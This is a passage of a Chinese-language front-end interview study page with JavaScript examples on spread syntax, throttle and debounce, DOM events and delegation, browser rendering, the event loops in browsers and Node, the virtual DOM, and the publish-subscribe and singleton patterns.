class="attr">stu</span>: &#123; <span class="attr">name</span>: newName &#125;,</span><br><span class="line">  &#125;,</span><br><span class="line">&#125; = school;</span><br><span class="line">newName; <span class="comment">// Bob</span></span><br></pre></td></tr></table></figure><h4 id="对象扩展运算"><a href="#对象扩展运算" class="headerlink" title="对象扩展运算"></a>对象扩展运算</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 对象扩展运算</span></span><br><span class="line"><span class="keyword">const</span> me = &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&quot;xiuyan&quot;</span>,</span><br><span class="line">  <span class="attr">age</span>: <span class="number">24</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> meCopy = &#123; ...me &#125;;</span><br><span class="line"></span><br><span class="line">meCopy; <span class="comment">// &#123;name: &quot;xiuyan&quot;, age: 24&#125;</span></span><br><span class="line"><span class="comment">// 数组扩展运算</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(...[<span class="string">&quot;haha&quot;</span>, <span class="string">&quot;hehe&quot;</span>, <span class="string">&quot;xixi&quot;</span>]); <span class="comment">// haha hehe xixi</span></span><br></pre></td></tr></table></figure><h4 id="类数组的转换"><a href="#类数组的转换" class="headerlink" title="类数组的转换"></a>类数组的转换</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> arrayLike = &#123; <span class="number">0</span>: <span class="string">&quot;Bob&quot;</span>, <span class="number">1</span>: <span class="string">&quot;Lucy&quot;</span>, <span class="number">2</span>: <span class="string">&quot;Daisy&quot;</span>, <span class="attr">length</span>: <span class="number">3</span> &#125;;</span><br><span class="line"><span class="comment">// Array原型上的slice方法—— 这个方法如果不传参数的话会返回原数组的一个拷贝，因此可以用此方法转换类数组到数组：</span></span><br><span class="line"><span class="keyword">const</span> arr = <span class="title class_">Array</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">slice</span>.<span class="title function_">call</span>(arrayLike);</span><br><span class="line"><span class="comment">// Array.from方法——这是 ES6 新增的一个数组方法，专门用来把类数组转为数组：</span></span><br><span class="line"><span class="keyword">const</span> arr = <span class="title class_">Array</span>.<span class="title function_">from</span>(arrayLike);</span><br></pre></td></tr></table></figure><h3 id="十一、-DOM-事件体系"><a href="#十一、-DOM-事件体系" class="headerlink" title="十一、 DOM 事件体系"></a>十一、 DOM 事件体系</h3><ul><li>节流（Throttle）在某段时间内，不管你触发了多少次回调，我都只认第一次，并在计时结束时给予响应。</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// fn是我们需要包装的事件回调, interval是时间间隔的阈值</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">throttle</span>(<span class="params">fn, interval</span>) &#123;</span><br><span class="line">  <span class="comment">// last为上一次触发回调的时间</span></span><br><span class="line">  <span class="keyword">let</span> last = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 将throttle处理结果当作函数返回</span></span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">// 保留调用时的this上下文</span></span><br><span class="line">    <span class="keyword">let</span> context = <span class="variable language_">this</span>;</span><br><span class="line">    <span class="comment">// 保留调用时传入的参数</span></span><br><span class="line">    <span class="keyword">let</span> args = <span class="variable language_">arguments</span>;</span><br><span class="line">    <span class="comment">// 记录本次触发回调的时间</span></span><br><span class="line">    <span class="keyword">let</span> now = +<span class="keyword">new</span> <span class="title class_">Date</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 判断上次触发的时间和本次触发的时间差是否小于时间间隔的阈值</span></span><br><span class="line">    <span class="keyword">if</span> (now - last &gt;= interval) &#123;</span><br><span class="line">      <span class="comment">// 如果时间间隔大于我们设定的时间间隔阈值，则执行回调</span></span><br><span class="line">      last = now;</span><br><span class="line">      fn.<span class="title function_">apply</span>(context, args);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 用throttle来包装scroll的回调</span></span><br><span class="line"><span class="keyword">const</span> better_scroll = <span class="title function_">throttle</span>(<span class="function">() =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;触发了滚动事件&quot;</span>), <span class="number">1000</span>);</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">addEventListener</span>(<span class="string">&quot;scroll&quot;</span>, better_scroll);</span><br></pre></td></tr></table></figure><ul><li>防抖（Debounce）在某段时间内，不管你触发了多少次回调，我都只认最后一次。</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// fn是我们需要包装的事件回调, delay是每次推迟执行的等待时间</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">debounce</span>(<span class="params">fn, delay</span>) &#123;</span><br><span class="line">  <span class="comment">// 定时器</span></span><br><span class="line">  <span class="keyword">let</span> timer = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 将debounce处理结果当作函数返回</span></span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">// 保留调用时的this上下文</span></span><br><span class="line">    <span class="keyword">let</span> context = <span class="variable language_">this</span>;</span><br><span class="line">    <span class="comment">// 保留调用时传入的参数</span></span><br><span class="line">    <span class="keyword">let</span> args = <span class="variable language_">arguments</span>;</span><br><span class="line">    <span class="comment">// 每次事件被触发时，都去清除之前的旧定时器</span></span><br><span class="line">    <span class="keyword">if</span> (timer) &#123;</span><br><span class="line">      <span class="built_in">clearTimeout</span>(timer);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 设立新定时器</span></span><br><span class="line">    timer = <span class="built_in">setTimeout</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">      fn.<span class="title function_">apply</span>(context, args);</span><br><span class="line">    &#125;, delay);</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 用debounce来包装scroll的回调</span></span><br><span class="line"><span class="keyword">const</span> better_scroll = <span class="title function_">debounce</span>(<span class="function">() =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;触发了滚动事件&quot;</span>), <span class="number">1000</span>);</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">addEventListener</span>(<span class="string">&quot;scroll&quot;</span>, better_scroll);</span><br></pre></td></tr></table></figure><h4 id="DOM-事件流"><a href="#DOM-事件流" class="headerlink" title="DOM 事件流"></a>DOM 事件流</h4><ul><li>事件捕获阶段</li><li>目标阶段</li><li>事件冒泡阶段</li></ul><h4 id="自定义事件"><a href="#自定义事件" class="headerlink" title="自定义事件"></a>自定义事件</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 实现在点击A之后，B 和 C 都能感知到 A 被点击了，并且做出相应的行为——就像这个点击事件是点在 B 和 C 上一样。</span></span><br><span class="line">&lt;body&gt;</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;divA&quot;</span>&gt;</span>我是A<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;divB&quot;</span>&gt;</span>我是B<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;divC&quot;</span>&gt;</span>我是C<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">&lt;/body&gt;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建一个本来不存在的&quot;clickA&quot;事件，来表示 A 被点击了，咱们可以这么写：</span></span><br><span class="line"><span class="keyword">var</span> clickAEvent = <span class="keyword">new</span> <span class="title class_">Event</span>(<span class="string">&quot;clickA&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取 divB 元素</span></span><br><span class="line"><span class="keyword">var</span> divB = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;divB&quot;</span>);</span><br><span class="line"><span class="comment">// divB 监听 clickA 事件</span></span><br><span class="line">divB.<span class="title function_">addEventListener</span>(<span class="string">&quot;clickA&quot;</span>, <span class="keyword">function</span> (<span class="params">e</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;我是小B，我感觉到了小A&quot;</span>);</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(e.<span class="property">target</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取 divC 元素</span></span><br><span class="line"><span class="keyword">var</span> divC = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;divC&quot;</span>);</span><br><span class="line"><span class="comment">// divC 监听 clickA 事件</span></span><br><span class="line">divC.<span class="title function_">addEventListener</span>(<span class="string">&quot;clickA&quot;</span>, <span class="keyword">function</span> (<span class="params">e</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;我是小C，我感觉到了小A&quot;</span>);</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(e.<span class="property">target</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// A 元素的监听函数也得改造下</span></span><br><span class="line">divA.<span class="title function_">addEventListener</span>(<span class="string">&quot;click&quot;</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;我是小A&quot;</span>);</span><br><span class="line">  <span class="comment">// 注意这里 dispatch 这个动作，就是我们自己派发事件了</span></span><br><span class="line">  divB.<span class="title function_">dispatchEvent</span>(clickAEvent);</span><br><span class="line">  divC.<span class="title function_">dispatchEvent</span>(clickAEvent);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h4 id="事件代理"><a href="#事件代理" class="headerlink" title="事件代理"></a>事件代理</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">&lt;!<span class="variable constant_">DOCTYPE</span> html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">  &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="line">  &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;ie=edge&quot;&gt;</span><br><span class="line">  &lt;title&gt;Document&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">  &lt;ul id=&quot;poem&quot;&gt;</span><br><span class="line">    &lt;li&gt;鹅鹅鹅&lt;/li&gt;</span><br><span class="line">    &lt;li&gt;曲项向天歌&lt;/li&gt;</span><br><span class="line">    &lt;li&gt;白毛浮绿水&lt;/li&gt;</span><br><span class="line">    &lt;li&gt;红掌拨清波&lt;/li&gt;</span><br><span class="line">    &lt;li&gt;锄禾日当午&lt;/li&gt;</span><br><span class="line">    &lt;li&gt;汗滴禾下土&lt;/li&gt;</span><br><span class="line">    &lt;li&gt;谁知盘中餐&lt;/li&gt;</span><br><span class="line">    &lt;li&gt;粒粒皆辛苦&lt;/li&gt;</span><br><span class="line">    &lt;li&gt;背不动了&lt;/li&gt;</span><br><span class="line">    &lt;li&gt;我背不动了&lt;/li&gt;</span><br><span class="line">  &lt;/ul&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">  // 获取 li 列表下面做法0分</span><br><span class="line">  var liList = document.getElementsByTagName(&#x27;li&#x27;)</span><br><span class="line">  // 逐个安装监听函数</span><br><span class="line">  for (var i = 0; i &lt; liList.length; i++) &#123;</span><br><span class="line">    liList[i].addEventListener(&#x27;click&#x27;, function (e) &#123;</span><br><span class="line">      console.log(e.target.innerHTML)</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line">//  正确做法</span><br><span class="line">  var ul = document.getElementById(&#x27;poem&#x27;)</span><br><span class="line">  ul.addEventListener(&#x27;click&#x27;, function(e)&#123;</span><br><span class="line">    console.log(e.target.innerHTML)</span><br><span class="line">  &#125;)</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="十二、浏览器渲染原理"><a href="#十二、浏览器渲染原理" class="headerlink" title="十二、浏览器渲染原理"></a>十二、浏览器渲染原理</h3><p>目前市面上常见的浏览器内核有以下几种：</p><p>Trident（IE）<br>Gecko（火狐）<br>Blink（Chrome、Opera）<br>Webkit（Safari）。<br><strong>渲染引擎处理</strong></p><ol><li>HTML 解析 =&gt;DOM 树</li></ol><p>在这一步浏览器对 HTML 文档进行解析，并在解析 HTML 的过程中发出了页面渲染所需的各种外部资源请求。</p><ol start="2"><li><p>CSS 解析 =&gt; CSSOM 树<br>浏览器将识别并加载所有的 CSS 样式信息。</p></li><li><p>样式与结构合并 =&gt;渲染树(DOM 树与 CSSOM 树“合体” ——渲染树)<br>将样式信息和文档结构合并，最终生成页面 render 树（:after :before 这样的伪元素会在这个环节被构建到 DOM 树中）。</p></li><li><p>布局阶段 =&gt;盒模型<br>页面中所有元素的相对位置信息，大小等信息均在这一步得到计算。</p></li><li><p>页面绘制 =&gt; 目标界面<br>在这一步中浏览器会根据我们前面处理出来的结果，把每一个页面图层转换为像素，并对所有的媒体文件进行解码。</p></li></ol><ul><li>重排 <em>重排多数情况下是由对元素几何属性的修改引发的</em> 如何触发重排<ul><li>改变 DOM 树的结构</li><li>获取一些特定属性的值（重要）<br>如 offsetTop、offsetLeft、 offsetWidth、offsetHeight、scrollTop、scrollLeft、scrollWidth、scrollHeight、clientTop、clientLeft、clientWidth、clientHeight 等属性（挑几个背下来，答题的时候不要哑了）。</li></ul></li><li>重绘<em>当我们对 DOM 的修改导致了样式的变化、却并未影响其几何属性（比如修改了颜色或背景色）</em><br><code>都会更新cssom树 =&gt; 更新渲染树 =&gt; 重新绘制</code> 重绘不会触发重新布局</li></ul><h3 id="十三、浏览器中的-Event-Loop-机制解析"><a href="#十三、浏览器中的-Event-Loop-机制解析" class="headerlink" title="十三、浏览器中的 Event-Loop 机制解析"></a>十三、浏览器中的 Event-Loop 机制解析</h3><p><strong>函数调用栈、宏任务（macro-task)队列和微任务(micro-task)队列。</strong></p><ul><li><p>当引擎第一次遇到 JS 代码时，会产生一个全局执行上下文并压入调用栈。后面每遇到一个函数调用，就会往栈中压入一个新的函数上下文。JS 引擎会执行栈顶的函数，执行完毕后，弹出对应的上下文</p></li><li><p>宏任务队列：常见的 macro-task 比如： setTimeout、setInterval、 setImmediate（node 独有）、 script（整体代码）、I/O 操作等。</p></li><li><p>微任务队列：常见的 micro-task 比如: process.nextTick（node 独有）、Promise、MutationObserver 等</p></li></ul><h3 id="十四、node-中的-Event-Loop"><a href="#十四、node-中的-Event-Loop" class="headerlink" title="十四、node 中的 Event-Loop"></a>十四、node 中的 Event-Loop</h3><p><strong>Node 整体上由这三部分组成：</strong><br>1:应用层：这一层就是大家最熟悉的 Node.js 代码，包括 Node 应用以及一些标准库。</p><p>2:桥接层：Node 底层是用 C++ 来实现的。桥接层负责封装底层依赖的 C++ 模块的能力，将其简化为 API 向应用层提供服务。</p><p>3:底层依赖：这里就是最最底层的 C++ 库了，支撑 Node 运行的最基本能力在此汇聚。其中需要特别引起大家注意的就是 V8 和 libuv：</p><p>V8 是 JS 的运行引擎，它负责把 JavaScript 代码转换成 C++，然后去跑这层 C++ 代码。<br>libuv：它对跨平台的异步 I/O 能力进行封装，同时也是我们本节的主角：Node 中的事件循环就是由 libuv 来初始化的。</p><p><strong>libuv 六个循环阶段</strong></p><p>1:timers 阶段：执行 setTimeout 和 setInterval 中定义的回调；<br>2:pending callbacks：直译过来是“被挂起的回调”，如果网络 I/O 或者文件 I/O 的过程中出现了错误，就会在这个阶段处理错误的回调（比较少见，可以略过）；<br>3:idle, prepare：仅系统内部使用。这个阶段我们开发者不需要操心。（可以略过）；<br>4:poll （轮询阶段）：重点阶段，这个阶段会执行 I/O 回调，同时还会检查定时器是否到期；<br>5:check（检查阶段）：处理 setImmediate 中定义的回调；<br>6:close callbacks：处理一些“关闭”的回调，比如 socket.on(‘close’, …)就会在这个阶段被触发。<br><code>Node 中的事件循环流程</code></p><ul><li>1:执行全局的 Script 代码（与浏览器无差）；</li><li>2:把微任务队列清空：注意，Node 清空微任务队列的手法比较特别。在浏览器中，我们只有一个微任务队列需要接受处理；但在 Node 中，有两类微任务队列：next-tick 队列和其它队列。其中这个 next-tick 队列，专门用来收敛 process.nextTick 派发的异步任务。在清空队列时，优先清空 next-tick 队列中的任务，随后才会清空其它微任务；</li><li>3:开始执行 macro-task（宏任务）。注意，Node 执行宏任务的方式与浏览器不同：在浏览器中，我们每次出队并执行一个宏任务；而在 Node 中，我们每次会尝试清空当前阶段对应宏任务队列里的所有任务（除非达到了系统限制）；<br><code>整体来看，Node 中每次执行异步任务都是以批量的形式，“一队一队”地执行。循环形式为：宏任务队列 -&gt; 微任务队列 -&gt; 宏任务队列 —&gt; 微任务队列… 这样交替进行。</code></li></ul><h3 id="十五、虚拟-DOM"><a href="#十五、虚拟-DOM" class="headerlink" title="十五、虚拟 DOM"></a>十五、虚拟 DOM</h3><p>虚拟 DOM 这一层是用 JS 实现的。也就是说在这个阶段所有的更改、对比操作都是纯 JS 层面的计算。JS vs DOM 操作，其性能消耗完全不在一个量级上。</p><p><strong>数据 + 模板 = 虚拟 DOM -&gt; diff 新旧两套虚拟 DOM 的差异，得到补丁集 -&gt; 把“补丁”打到真实 DOM 上</strong></p><h3 id="十六、设计模式"><a href="#十六、设计模式" class="headerlink" title="十六、设计模式"></a>十六、设计模式</h3><ul><li><p>发布订阅</p><ul><li>vue 总线机制</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">EventEmitter</span> &#123;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">// handlers是一个map，用于存储事件与回调之间的对应关系</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">handlers</span> = &#123;&#125;;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// on方法用于安装事件监听器，它接受目标事件名和回调函数作为参数</span></span><br><span class="line">  <span class="title function_">on</span>(<span class="params">eventName, cb</span>) &#123;</span><br><span class="line">    <span class="comment">// 先检查一下目标事件名有没有对应的监听函数队列</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable language_">this</span>.<span class="property">handlers</span>[eventName]) &#123;</span><br><span class="line">      <span class="comment">// 如果没有，那么首先初始化一个监听函数队列</span></span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">handlers</span>[eventName] = [];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 把回调函数推入目标事件的监听函数队列里去</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">handlers</span>[eventName].<span class="title function_">push</span>(cb);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// emit方法用于触发目标事件，它接受事件名和监听函数入参作为参数</span></span><br><span class="line">  <span class="title function_">emit</span>(<span class="params">eventName, ...args</span>) &#123;</span><br><span class="line">    <span class="comment">// 检查目标事件是否有监听函数队列</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">handlers</span>[eventName]) &#123;</span><br><span class="line">      <span class="comment">// 如果有，则逐个调用队列里的回调函数</span></span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">handlers</span>[eventName].<span class="title function_">forEach</span>(<span class="function">(<span class="params">callback</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="title function_">callback</span>(...args);</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>单例模式</p><ul><li>实现一个模态框<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">&lt;!<span class="variable constant_">DOCTYPE</span> html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;单例模式真题解读&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">    #modal &#123;</span><br><span class="line">        height: 300px;</span><br><span class="line">        width: 300px;</span><br><span class="line">        line-height: 300px;</span><br><span class="line">        position: fixed;</span><br><span class="line">        left: 50%;</span><br><span class="line">        top: 50%;</span><br><span class="line">        transform: translate(-50%, -50%);</span><br><span class="line">        border: 1px solid red;</span><br><span class="line">        text-align: center;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;button id=&#x27;open&#x27;&gt;打开 Modal 弹层&lt;/button&gt;</span><br><span class="line">    &lt;button id=&#x27;close&#x27;&gt;关闭 Modal 弹层&lt;/button&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">// 点击打开按钮展示模态框</span><br><span class="line">document.getElementById(&quot;open&quot;).addEventListener(&quot;click&quot;, function () &#123;</span><br><span class="line">  // 未点击则不创建modal实例，避免不必要的内存占用;此处不用 new Modal 的形式调用也可以，和 Storage 同理</span><br><span class="line">  const modal = createModal();</span><br><span class="line">  modal.style.display = &quot;block&quot;;</span><br><span class="line">&#125;);</span><br><span class="line">// 点击关闭按钮隐藏模态框</span><br><span class="line">document.getElementById(&#x27;close&#x27;).addEventListener(&#x27;click&#x27;, function() &#123;</span><br><span class="line">const modal = createModal()</span><br><span class="line">if(modal) &#123;</span><br><span class="line">modal.style.display = &#x27;none&#x27;</span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br><span class="line">// 核心逻辑，这里采用了闭包思路来实现单例模式</span><br><span class="line">const createModal = (function() &#123;</span><br><span class="line">let modal = null</span><br><span class="line">return function() &#123;</span><br><span class="line">if(!modal) &#123;</span><br><span class="line">modal = document.createElement(&#x27;div&#x27;)</span><br><span class="line">modal.innerHTML = &#x27;Modal 模态框，全局唯一&#x27;</span><br><span class="line">modal.id = &#x27;modal&#x27;</span><br><span class="line">modal.style.display = &#x27;none&#x27;</span><br><span class="line">document.body.appendChild(modal)</span><br><span class="line">&#125;</span><br><span class="line">return modal</span><br><span class="line">&#125;</span><br><span class="line">&#125;)()</span><br></pre></td></tr></table></figure></li></ul></li></ul><h3 id="十七、手写题目"><a href="#十七、手写题目" class="headerlink" title="十七、手写题目"></a>十七、手写题目</h3><ul><li><ol><li>防抖</li></ol></li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">debounce</span>(<span class="params">func, ms = <span class="number">1000</span></span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> timer;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">function</span> (<span class="params">...args</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (timer) &#123;</span><br><span class="line">      <span class="built_in">clearTimeout</span>(timer)</span><br><span class="line">    &#125;</span><br><span class="line">    timer = <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      func.<span class="title function_">apply</span>(<span class="variable language_">this</span>, args)</span><br><span class="line">    &#125;, ms)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 测试</span></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">task</span> = (<span class="params"></span>) =&gt; &#123; <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;run task&#x27;</span>) &#125;</span><br><span class="line"><span class="keyword">const</span> debounceTask = <span class="title function_">debounce</span>(task, <span class="number">1000</span>)</span><br><span class="line"><span class="variable 